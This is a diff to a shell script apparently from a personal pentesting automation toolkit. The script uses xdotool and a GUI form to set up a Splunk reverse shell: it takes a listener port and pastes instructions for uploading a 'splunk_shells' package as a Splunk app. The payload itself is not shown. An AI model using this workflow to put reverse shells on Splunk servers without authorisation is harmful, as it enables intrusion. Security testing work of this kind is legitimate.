@@ -4,17 +4,15 @@
 Create splunk rev shell
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
-source ~/Desktop/base/code/xdotool/helpers/find_and_replace_in_file.sh
+REV_FOLDER="${SCRIPT_DIR}/shell/msfvenom/.files/reverse_shell_splunk"
 
-REV_FOLDER="${HOME}/Desktop/base/code/xdotool/scripts/shell/msfvenom/.files/reverse_shell_splunk"
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+PORT_FIELD=$(form_item  "port" "number" "port" "1337")
 
-# Generate gui form
-generate_form "PORT"
+# Generate GUI form
+generate_form "${PORT_FIELD}"
 
-PORT=${form_data["PORT"]}
+PORT=${form_data["port"]}
 
 paste_command "# upload ${REV_FOLDER}/splunk_shells-1.2.tar.gz -> click on the gear icon on the top left -> Install app from file -> Upload file"
 xdotool key Return
